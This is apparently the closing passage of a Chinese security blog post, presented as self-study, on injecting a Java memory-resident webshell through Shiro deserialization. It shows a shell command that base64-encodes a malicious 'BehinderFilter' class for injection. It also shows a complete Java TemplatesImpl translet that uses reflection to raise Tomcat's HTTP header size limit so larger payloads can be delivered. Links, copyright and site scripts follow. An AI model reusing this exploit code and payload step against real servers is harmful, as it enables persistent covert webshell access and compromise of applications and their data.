+<p>然后把生成恶意类的base64编码，即可完成注入内存马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat BehinderFilter.class|base64 |sed &#x27;:label;N;s/\n//;b label&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>由于我本地注入内存马有问题，这里就弹个计算器证明可行</p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220508202939582.png" alt="image-20220508202939582"></p>
+<p>关于修改请求头长度来进行绕过，我本地并没有复现成功，这里也把别的师傅的代码贴一下吧，以便于我自己后续进行学习</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatHeaderSize</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField(<span class="string">&quot;headerBufferSize&quot;</span>);</span><br><span class="line">            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">            contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            headerSizeField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            serviceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            getHandlerMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =</span><br><span class="line">                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());</span><br><span class="line">            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br><span class="line">            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; connectors.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">4</span> == connectors[i].getScheme().length()) &#123;</span><br><span class="line">                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();</span><br><span class="line">                    <span class="keyword">if</span> (protocolHandler <span class="keyword">instanceof</span> org.apache.coyote.http11.AbstractHttp11Protocol) &#123;</span><br><span class="line">                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; classes.length; j++) &#123;</span><br><span class="line">                        <span class="comment">// org.apache.coyote.AbstractProtocol$ConnectionHandler</span></span><br><span class="line">                            <span class="keyword">if</span> (<span class="number">52</span> == (classes[j].getName().length()) || <span class="number">60</span> == (classes[j].getName().length())) &#123;</span><br><span class="line">                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                                globalField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                                processorsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, <span class="keyword">null</span>));</span><br><span class="line">                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; list.size(); k++) &#123;</span><br><span class="line">                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));</span><br><span class="line">                                  <span class="comment">// 10000 为修改后的 headersize </span></span><br><span class="line">                                    headerSizeField.set(tempRequest.getInputBuffer(),<span class="number">10000</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                         <span class="comment">// 10000 为修改后的 headersize </span></span><br><span class="line">                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(<span class="number">10000</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914">https://xz.aliyun.com/t/9914</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388#toc-2">https://xz.aliyun.com/t/7388#toc-2</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10696#toc-2">https://xz.aliyun.com/t/10696#toc-2</a></p>
+<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1545">http://wjlshare.com/archives/1545</a></p>
+<p><a target="_blank" rel="noopener" href="https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8A%E8%BD%BDreGeorg%E4%BB%A3%E7%90%86">https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8A%E8%BD%BDreGeorg%E4%BB%A3%E7%90%86</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914#toc-3">https://xz.aliyun.com/t/9914#toc-3</a></p>
+<p><a target="_blank" rel="noopener" href="https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%94%B9%E9%80%A0reGeorg">https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%94%B9%E9%80%A0reGeorg</a></p>
+
+  </div>
+   
+   
+
+  
+  <div class="post-copyright">
+    <div class="post-copyright-icon"></div>
+      <div class="post-copyright-author">
+          <span class="post-copyright-meta">文章作者: </span>
+            <span class="post-copyright-info">
+              <a href="mailto:1444440144@qq.com" >ch1e</a>
+            </span>
+      </div>
+      <div class="post-copyright-type">
+          <span class="post-copyright-meta">文章链接: </span>
+            <span class="post-copyright-info">
+              <a href="https://ch1e.cn/2022/05/07/shiroMemory/" >https://ch1e.cn/2022/05/07/shiroMemory/</a>
+            </span>
+      </div><div class="post-copyright-notice">
+          <span class="post-copyright-meta">版权声明: </span>
+            <span class="post-copyright-info">本博客所有文章除特别声明外，均采用
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/ " target="_blank" >
+                  CC BY-NC-SA 4.0 </a> 许可协议。转载请注明来自
+              <a href="https://ch1e.cn/2022/05/07/shiroMemory/" target="_blank" >ch1e</a>
+              ！</span>
+      </div>
+  </div>
+  
+
+
+ 
+
+  
+    <div class="post-tag">
+        <span>
+            <i class="fa fa-tag"></i>
+             
+            <a href="tags/web安全/"><span>web安全</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/Java安全/"><span>Java安全</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/反序列化/"><span>反序列化</span></a>
+                
+            
+        </span>
+    </div>
+  
+
+
+
+
+<div class="pagination-post">
+    
+    <a href="/2022/05/08/fastjsonMemory/">
+      <div class="prev-title"><i class="fas fa-chevron-left"></i>Fastjson反序列化注入内存马</div>
+      <div class="prev-desc">前言学习完shiro反序列化注入内存马后，来学习一下创建的fastjson吧，fastjson和shiro不一样，fastjson是我自己打成功以后才写的文章，shiro确实是本地环境应该有问题...</div>
+    </a>
+    
+    
+    <a href="/2022/05/05/rome/">
+      <div class="next-title">Rome反序列化链分析<i class="fas fa-chevron-right"></i></div>
+      <div class="next-desc">环境搭建下载地址：http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar，下载完以后导入rome包即可。
+我们可以先使用ysoseri...</div>
+    </a>
+    
+</div>
+
+</article>
+ 
+
+
+  <div id="toc-wrap">
+    <div id="toc">
+      <div class="toc-title">
+        <div>
+          目录
+            <span class="num">0%</span>
+        </div>
+        <progress class="progress" value="0" max="100"></progress>
+      </div>
+      <div class="toc-list">
+         
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Shiro反序列化注入内存马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">绕过请求头长度限制注入内存马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+      </div>
+    </div>
+  </div>
+
+
+        </main>
+        <section id="rightside">
+    
+    <div class="rightside-item">
+        
+        
+         
+        
+        
+            <a id="open-toc" title="目录">
+                <i class="fas fa-list-ul"></i>
+            </a>
+        
+         
+         
+        <a href="javascript:(0)" id="darkmode" title="深色/浅色 ">
+            <i class="fas fa-moon"></i>
+        </a>
+         
+        
+        <a href="#" title="回到顶部">
+            <i class="fas fa-arrow-up"></i>
+        </a>
+    </div>
+</section>
+         
+
+<footer class="footer" id="footer">
+    <div class="copyright">
+      &copy; 2020 - 2022
+        <i class="fas fa-fan"></i>
+        ch1e
+    </div>
+    <div class="framework-info">
+        <span>框架 </span>
+        <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="footer-separator">|</span>
+        <span>主题 </span>
+        <a href="https://github.com/lete114/hexo-theme-MengD" target="_blank">MengD.(萌典) </a>
+    </div>
+    
+    <div class="custom-text">我相信我可以，但我一直在路上，所以我有无限的可能！！</div>
+</footer>
+    </div>
+    <div id="mask" onclick="closeAll()"></div>
+    
+    <div class="script">
+        <script src="/js/main.js"></script>
+        
+
+
+<script src="/js/lazyload.js"></script>
+
+
+    
+
+
+        
+    <script>
+        getScript('https://cdn.jsdelivr.net/npm/pjax/pjax.min.js',LoadPjax)
+        function LoadPjax() {
+            var pjax = new Pjax({
+                selectors: [
+                    'head title',
+                    'head meta[name="keywords"]',
+                    'head meta[name="description"]',
+                    'main',
+                    '#rightside'
+                ],
+                cache: true,
+                cacheBust: false
+            });
+        }
+
+        // 清除时间
+        var timer = null;
+        // 执行进度条
+        function ProgressStart() {
+            // 设置初始进度
+            var progress = 10;
+            // 创建进度条 及 css样式
+            var div = document.createElement('div');
+            div.className = 'pjax-progress';
+            document.body.prepend(div);
+            // 定义随机数最大值最小值
+            var max = 10, mini = 3;
+            var result = max - mini;
+            // 清除
+            clearInterval(timer);
+            // 0.5秒内累加进度
+            timer = setInterval(function () {
+                // 随机数
+                var num = parseInt(Math.random() * result);
+                var randomResult = num + mini;
+                // 累加
+                progress += randomResult
+                document.getElementsByClassName('pjax-progress')[0].style.width = progress + '%';
+                // 当进度达到95%时停止
+                if (progress > 95) progress = 95
+            }, 500)
+        }
+        // 加载进度条加载完毕
+        function ProgressFinish() {
+            clearInterval(timer);
+            // 页面加载完毕后进度100% 并在0.7秒后删除
+            var progress = document.getElementsByClassName('pjax-progress');
+            progress[0].style.width = '100%';
+            timer = setTimeout(function () {
+                progress[0].parentNode.removeChild(progress[0])
+            }, 700);
+        }
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+            // 执行进度条
+            ProgressStart()
+        });
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+
+            // 加载进度条加载完毕
+            ProgressFinish()
+            // 执行所有方法
+            exeAllFn()
+
+            
+                // 图片懒加载
+                ImgLazyLoad('body img[data-img]', 'data-img')
+            
+
+
+            document.querySelectorAll('script[data-pjax]').forEach(item => {
+                const newScript = document.createElement('script')
+                const content = item.text || item.textContent || item.innerHTML || ''
+                Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+                newScript.appendChild(document.createTextNode(content))
+                item.parentNode.replaceChild(newScript, item)
+            })
+        });
+
+        // Pjax请求错误时，跳转到404页面
+        document.addEventListener('pjax:error', (err) => {
+            if (err.request.status === 404) {
+                pjax.loadUrl('/404.html')
+            }
+        })
+    </script>
+
+    </div>
+</body>
+
+</html>
